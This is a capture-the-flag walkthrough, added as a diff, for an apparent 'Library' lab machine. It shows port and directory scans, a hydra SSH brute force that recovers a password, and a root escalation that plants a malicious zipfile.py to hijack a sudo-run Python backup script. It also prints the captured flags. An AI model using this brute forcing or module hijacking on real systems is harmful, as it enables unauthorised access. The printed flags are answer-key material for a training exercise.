@@ -1,0 +1,152 @@
+LIBRARY.
+
+
+
+
+[>>> 1. ENUMERATION: PORTS/SERVICES]
+[ACTION: nmap quick all ports scan]
+nmap -sS -sV -T4 -p- 10.10.13.239
+[OUTPUT]
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+
+
+[>>> 2. RECON: http://10.10.13.239/]
+[ACTION: explore http://10.10.13.239/]
+We land on a template for a website. 
+None of the buttons on the navigation bar work.
+I found a username (author of blog post): meliodas.
+And 3 others in the comments: root, www-data, Anonymous.
+Source code has no clues.
+[NOTE]
+Looks like I need to do some directory enumeration.
+
+
+
+
+[>>> 3. ENUMERATION: DIRECTORIES]
+[ACTION: gobuster scan for common directories]
+gobuster dir -u http://10.10.13.239/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
+[OUTPUT]
+/.htaccess            (Status: 403) [Size: 296]
+/.hta                 (Status: 403) [Size: 291]
+/.htpasswd            (Status: 403) [Size: 296]
+/images               (Status: 301) [Size: 313] [--> http://10.10.13.239/images/]
+/index.html           (Status: 200) [Size: 5439]
+/robots.txt           (Status: 200) [Size: 33]
+/server-status        (Status: 403) [Size: 300]
+Progress: 4746 / 4747 (99.98%)
+
+
+[ACTION: explore http://10.10.13.239/robots.txt]
+[OUTPUT]
+User-agent: rockyou 
+Disallow: /
+[NOTE]
+This is a clear clue that we have to bruteforce something using the rockyou password list.
+
+
+[ACTION: gobuster long directory scan]
+gobuster dir -u http://10.10.13.239/ -w /home/user0/Documents/gobuster/directory-list-2.3-medium.txt
+[NOTE]
+Left running in background.
+
+
+
+
+[>>> 4. PRIVESC: TO USER]
+[ACTION: attempt to bruteforce via hydra]
+hydra -L library_users.txt -P ~/thm/rockyou.txt 10.10.13.239 ssh
+[OUTPUT]
+[22][ssh] host: 10.10.13.239   login: meliodas   password: iloveyou1
+
+
+[NOTE]
+Creds: meliodas|iloveyou1
+[ACTION: ssh as meliodas]
+ssh meliodas@10.10.13.239
+[OUTPUT]
+meliodas@ubuntu:~$
+
+
+
+
+[>>> 5. PRIVESC: TO ROOT]
+[ACTION: display user flag]
+cat user.txt
+[OUTPUT]
+6d488cbb3f111d135722c33cb635f4ec
+
+
+[ACTION: list content current directory]
+ls
+[OUTPUT]
+bak.py  user.txt
+
+
+
+[ACTION: display bak]
+cat bak.py
+[OUTPUT]
+#!/usr/bin/env python
+import os
+import zipfile
+
+def zipdir(path, ziph):
+    for root, dirs, files in os.walk(path):
+        for file in files:
+            ziph.write(os.path.join(root, file))
+
+if __name__ == '__main__':
+    zipf = zipfile.ZipFile('/var/backups/website.zip', 'w', zipfile.ZIP_DEFLATED)
+    zipdir('/var/www/html', zipf)
+    zipf.close()
+[NOTE]
+This script creates a zip backup of webserver (at /var/www/html).
+
+
+[ACTION: check current user sudo permissions]
+sudo -l
+[OUTPUT]
+Matching Defaults entries for meliodas on ubuntu:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User meliodas may run the following commands on ubuntu:
+    (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py
+[NOTE]
+We can run the script as root.
+If only we could edit it, we would be able to easily spawn a root rev shell.
+
+
+[ACTION: check permissions on bak]
+ls -l bak.py
+[OUTPUT]
+-rw-r--r-- 1 root root 353 Aug 23  2019 bak.py
+[NOTE]
+We can't directly inject our shell spawn.
+
+
+[NOTE]
+We might still be able to privesc exploiting the script.
+Due to the line "import zipfile", python searches first the current directory for zipfile.py
+This means we can create a malicious alternative, so that when we run bak from the same directory, whatever malicious injection we have done takes place.
+[ACTION: create malicious zipfile.py]
+echo 'import os; os.system("/bin/bash")' > zipfile.py
+
+
+[ACTION: run bak.py]
+sudo /usr/bin/python3 /home/meliodas/bak.py
+[OUTPUT]
+root@ubuntu:~# 
+
+
+[ACTION: display root flag]
+cat /root/root.txt
+[OUTPUT]
+e8c8c6c256c35515d1d344ee0488c617
+
